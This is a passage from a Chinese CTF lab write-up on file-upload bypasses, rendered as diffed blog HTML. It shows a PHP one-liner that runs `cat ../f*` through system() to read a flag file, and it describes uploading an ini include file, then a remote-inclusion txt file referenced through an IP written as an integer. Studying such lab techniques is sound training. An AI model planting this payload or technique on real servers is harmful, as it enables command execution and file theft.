+<p><img src="/../images/d6bc3eb2d69dbdebc785f2755e4b9a93.png" srcset="/img/loading.gif" lazyload alt="d6bc3eb2d69dbdebc785f2755e4b9a93"></p>
+<p>法二：</p>
+<p>新建文件abc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat ../f*&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>ip转数字：795762179</p>
+<p>官网：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">https://www.bejson.com/convert/ip2int/<br></code></pre></td></tr></table></figure>
+
+<p>先上传ini包含文件</p>
+<p><img src="/../images/c56dd2fe-4e41-4b3c-a83a-eeb5425bcdd2.png" srcset="/img/loading.gif" lazyload alt="c56dd2fe-4e41-4b3c-a83a-eeb5425bcdd2"></p>
+<p>再上传远程调用文件 txt</p>
+<p><img src="/../images/82338ce0-fff8-45b5-a0c9-5314553b8ce8.png" srcset="/img/loading.gif" lazyload alt="82338ce0-fff8-45b5-a0c9-5314553b8ce8"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF%E9%9D%B6%E5%9C%BA/" class="print-no-link">#CTF靶场</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>文件上传</div>
+      <div>http://maskobito.github.io/2025/05/06/CTF-文件上传/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>MaskObito</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年5月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/05/08/CTF-SSRF/" title="CTF-SSRF">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CTF-SSRF</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传">
+                        <span class="hidden-mobile">文件上传</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    
+      <script type="text/javascript">
+        var disqus_config = function() {
+          this.page.url = 'http://maskobito.github.io/2025/05/06/CTF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/';
+          this.page.identifier = '/2025/05/06/CTF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/';
+        };
+        Fluid.utils.loadComments('#disqus_thread', function() {
+          var d = document, s = d.createElement('script');
+          s.src = '//' + 'fluid' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', new Date());
+          (d.head || d.body).appendChild(s);
+        });
+      </script>
+    
+    <noscript>Please enable JavaScript to view the comments</noscript>
+  </div>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/typing-effect.js"></script>
+<script src="/js/particle.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
